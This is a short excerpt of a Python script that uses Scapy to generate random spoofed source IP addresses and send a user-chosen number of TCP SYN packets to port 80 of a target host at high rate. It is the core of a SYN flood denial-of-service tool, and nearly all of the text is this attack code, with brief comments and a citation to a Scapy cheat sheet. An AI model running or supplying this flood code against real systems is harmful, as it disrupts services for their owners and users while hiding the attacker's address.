...
def generaterandomsrc(): #generate a random source ip or spoof the ip so that it is not the actual source
    spoofip= str(rand.randint(0, 255)) + "." + str(rand.randint(0, 255)) + "." + str(rand.randint(0, 255))+ "."+ str(rand.randint(0, 255))
    return spoofip
#spoofedip=generaterandomsrc()
...
for i in range(int(nbofpkts)): #send a number of packets the user specifies
    ...
    send(IP(src=generaterandomsrc(), dst=dest) / TCP(sport=sport, dport=80, flags='S'), inter=0.0001) #source is scapy's tutorial on how to create packets with different layers https://weril.me/wp-content/uploads/2019/01/ScapyCheatSheet_v0.2.pdf
